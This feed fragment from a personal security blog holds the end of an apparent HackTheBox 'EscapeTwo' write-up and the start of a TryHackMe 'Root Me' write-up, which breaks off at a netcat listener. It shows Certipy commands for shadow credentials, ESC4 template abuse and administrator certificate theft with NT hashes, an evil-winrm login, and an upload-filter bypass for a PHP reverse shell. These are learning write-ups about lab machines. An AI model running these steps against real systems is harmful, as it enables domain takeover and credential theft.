+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;certipy-ad shadow auto -u &lt;span class="s1"&gt;&amp;#39;ryan@sequel.htb&amp;#39;&lt;/span&gt; -p &lt;span class="s1"&gt;&amp;#39;WqSZAF6CysDQbGb3&amp;#39;&lt;/span&gt; -account ca_svc -dc-ip 10.10.11.51
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Certipy v4.8.2 - by Oliver Lyak &lt;span class="o"&gt;(&lt;/span&gt;ly4k&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Targeting user &lt;span class="s1"&gt;&amp;#39;ca_svc&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Generating certificate
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Certificate generated
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Generating Key Credential
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Key Credential generated with DeviceID &lt;span class="s1"&gt;&amp;#39;ed99220f-857c-1616-06bc-e50d6900d173&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Adding Key Credential with device ID &lt;span class="s1"&gt;&amp;#39;ed99220f-857c-1616-06bc-e50d6900d173&amp;#39;&lt;/span&gt; to the Key Credentials &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ca_svc&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Successfully added Key Credential with device ID &lt;span class="s1"&gt;&amp;#39;ed99220f-857c-1616-06bc-e50d6900d173&amp;#39;&lt;/span&gt; to the Key Credentials &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ca_svc&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Authenticating as &lt;span class="s1"&gt;&amp;#39;ca_svc&amp;#39;&lt;/span&gt; with the certificate
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Using principal: ca_svc@sequel.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Trying to get TGT...
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Got TGT
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Saved credential cache to &lt;span class="s1"&gt;&amp;#39;ca_svc.ccache&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Trying to retrieve NT &lt;span class="nb"&gt;hash&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ca_svc&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Restoring the old Key Credentials &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ca_svc&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Successfully restored the old Key Credentials &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ca_svc&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; NT &lt;span class="nb"&gt;hash&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ca_svc&amp;#39;&lt;/span&gt;: 3b181b914e7a9d5508ea1e20bc2b7fce
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Find a vulnerable template with the hash of the ca_svc account&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;certipy-ad find -u &lt;span class="s1"&gt;&amp;#39;ca_svc@sequel.htb&amp;#39;&lt;/span&gt; -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vulnerable
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/16.png"
+width="776"
+height="228"
+srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/16_hu_62a59755f8145c85.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/16_hu_7f7d482470429c27.png 1024w"
+loading="lazy"
+alt="Vulnerable Cert"
+class="gallery-image"
+data-flex-grow="340"
+data-flex-basis="816px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Now upload the certificate template&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;KRB5CCNAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$PWD&lt;/span&gt;/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/17.png"
+width="496"
+height="73"
+srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/17_hu_f8228be16f78db04.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/17_hu_bca956267eec87d1.png 1024w"
+loading="lazy"
+alt="Cert Uploaded"
+class="gallery-image"
+data-flex-grow="679"
+data-flex-basis="1630px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Get the Admin Cert&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;certipy-ad req -u ca_svc -hashes &lt;span class="s1"&gt;&amp;#39;3b181b914e7a9d5508ea1e20bc2b7fce&amp;#39;&lt;/span&gt; -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Certipy v4.8.2 - by Oliver Lyak &lt;span class="o"&gt;(&lt;/span&gt;ly4k&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Trying to resolve &lt;span class="s1"&gt;&amp;#39;sequel.htb&amp;#39;&lt;/span&gt; at &lt;span class="s1"&gt;&amp;#39;10.10.11.51&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Generating RSA key
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Requesting certificate via RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Trying to connect to endpoint: ncacn_np:10.10.11.51&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="se"&gt;\p&lt;/span&gt;ipe&lt;span class="se"&gt;\c&lt;/span&gt;ert&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Connected to endpoint: ncacn_np:10.10.11.51&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="se"&gt;\p&lt;/span&gt;ipe&lt;span class="se"&gt;\c&lt;/span&gt;ert&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Successfully requested certificate
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Request ID is &lt;span class="m"&gt;22&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Got certificate with multiple identifications
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; UPN: &lt;span class="s1"&gt;&amp;#39;administrator@sequel.htb&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; DNS Host Name: &lt;span class="s1"&gt;&amp;#39;10.10.11.51&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Certificate has no object SID
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Saved certificate and private key to &lt;span class="s1"&gt;&amp;#39;administrator_10.pfx&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Now get the admin hash using the cert&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Certipy v4.8.2 - by Oliver Lyak &lt;span class="o"&gt;(&lt;/span&gt;ly4k&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Found multiple identifications in certificate
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Please &lt;span class="k"&gt;select&lt;/span&gt; one:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;[&lt;/span&gt;0&lt;span class="o"&gt;]&lt;/span&gt; UPN: &lt;span class="s1"&gt;&amp;#39;administrator@sequel.htb&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;[&lt;/span&gt;1&lt;span class="o"&gt;]&lt;/span&gt; DNS Host Name: &lt;span class="s1"&gt;&amp;#39;10.10.11.51&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;gt; &lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Using principal: administrator@sequel.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Trying to get TGT...
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Got TGT
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Saved credential cache to &lt;span class="s1"&gt;&amp;#39;administrator.ccache&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Trying to retrieve NT &lt;span class="nb"&gt;hash&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Got &lt;span class="nb"&gt;hash&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;administrator@sequel.htb&amp;#39;&lt;/span&gt;: xxxxxx:xxxx
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Login as Admin and you got the root flag&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;evil-winrm -i 10.10.11.51 -u &lt;span class="s2"&gt;&amp;#34;administrator&amp;#34;&lt;/span&gt; -H &lt;span class="s2"&gt;&amp;#34;xxxxxxx&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/18.png"
+width="488"
+height="213"
+srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/18_hu_e8242c726659c9d2.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/18_hu_467f085c1eb2fde7.png 1024w"
+loading="lazy"
+alt="Admin Flag"
+class="gallery-image"
+data-flex-grow="229"
+data-flex-basis="549px"
+&gt;&lt;/p&gt;
+&lt;h3 id="conclusion"&gt;Conclusion
+&lt;/h3&gt;&lt;p&gt;This machine covers topics like SMB shares leaks, MSSQL RCE, ESC4 Certificate Attack, Shadow Credentials Attack, weak ACLs and AD CS misconfigurations&lt;/p&gt;
+&lt;p&gt;&lt;mark&gt;Hope you enjoy it and Happy Hacking!&lt;/mark&gt;&lt;/p&gt;</description></item><item><title>THM Root Me - Writeup</title><link>https://solarspectre.github.io/p/thm-root-me-writeup/</link><pubDate>Wed, 05 Mar 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/thm-root-me-writeup/</guid><description>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/cover.png" alt="Featured image of post THM Root Me - Writeup" /&gt;&lt;p&gt;Let&amp;rsquo;s start with a fast scan, i normally use rustscan to gather the open ports faster:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;rustscan --top -a &amp;lt;victim_ip&amp;gt; &lt;span class="p"&gt;|&lt;/span&gt; tee initialScan.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/1.png"
+width="526"
+height="701"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/1_hu_9c53525f83bf454b.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/1_hu_c333d88834b69866.png 1024w"
+loading="lazy"
+alt="Image 1"
+class="gallery-image"
+data-flex-grow="75"
+data-flex-basis="180px"
+&gt;
+once it&amp;rsquo;s finished, i copy the open ports and scan them with nmap looking out for the versions of the services hosted in those ports&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sudo nmap -sC -sV -p&amp;lt;ports&amp;gt; &amp;lt;ip&amp;gt; -oN targeted
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/2.png"
+width="647"
+height="411"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/2_hu_d5498e0f5e48e977.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/2_hu_b1b043e898df6153.png 1024w"
+loading="lazy"
+alt="Image 2"
+class="gallery-image"
+data-flex-grow="157"
+data-flex-basis="377px"
+&gt;
+Now, the scan shows that the machine is hosting a web server with Apache, we can take a look at the directories the website has with gobuster&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;gobuster dir -t &lt;span class="m"&gt;45&lt;/span&gt; -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://&amp;lt;ip&amp;gt;/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/3.png"
+width="662"
+height="412"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/3_hu_58353679a81d8403.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/3_hu_9dd1b6fde54a44b9.png 1024w"
+loading="lazy"
+alt="Image 3"
+class="gallery-image"
+data-flex-grow="160"
+data-flex-basis="385px"
+&gt;&lt;/p&gt;
+&lt;h3 id="task-2"&gt;Task 2
+&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;How many ports are open? 2
+What version of Apache is running? 2.4.29
+What service is running on port 22? SSH
+What is the hidden directory? /panel/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id="user-flag"&gt;User Flag
+&lt;/h3&gt;&lt;p&gt;Visiting the website shows us this
+&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/4.png"
+width="972"
+height="345"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/4_hu_cc81225b523a90b0.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/4_hu_67f4a1f1d982539f.png 1024w"
+loading="lazy"
+alt="Image 4"
+class="gallery-image"
+data-flex-grow="281"
+data-flex-basis="676px"
+&gt;
+and going to the /panel route shows a file upload page
+&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/5.png"
+width="1072"
+height="813"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/5_hu_75fa1584ddc2e02f.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/5_hu_a36a5ccacd0c767d.png 1024w"
+loading="lazy"
+alt="Image 5"
+class="gallery-image"
+data-flex-grow="131"
+data-flex-basis="316px"
+&gt;
+There&amp;rsquo;s an arbitrary file upload vulnerability in this page, allowing us to upload a maliciously crafted php file that we can use to upload and execute a reverse shell, you can use this shell from pentestmonkey
+&lt;a class="link" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener"
+&gt;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/6.png"
+width="674"
+height="634"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/6_hu_28dc4c913f1a2e6f.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/6_hu_306e548438f0d55d.png 1024w"
+loading="lazy"
+alt="Image 6"
+class="gallery-image"
+data-flex-grow="106"
+data-flex-basis="255px"
+&gt;&lt;/p&gt;
+&lt;p&gt;But php is not allowed to be uploaded, we can bypass this validation changing the file extension to be php5&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/7.png"
+width="613"
+height="603"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/7_hu_6841a7345ed24010.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/7_hu_c1eeaf36a3415c35.png 1024w"
+loading="lazy"
+alt="Image 7"
+class="gallery-image"
+data-flex-grow="101"
+data-flex-basis="243px"
+&gt;&lt;/p&gt;
+&lt;p&gt;Then start a listener with netcat:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nc -lvnp &lt;span class="m"&gt;4242&lt;/span&gt;
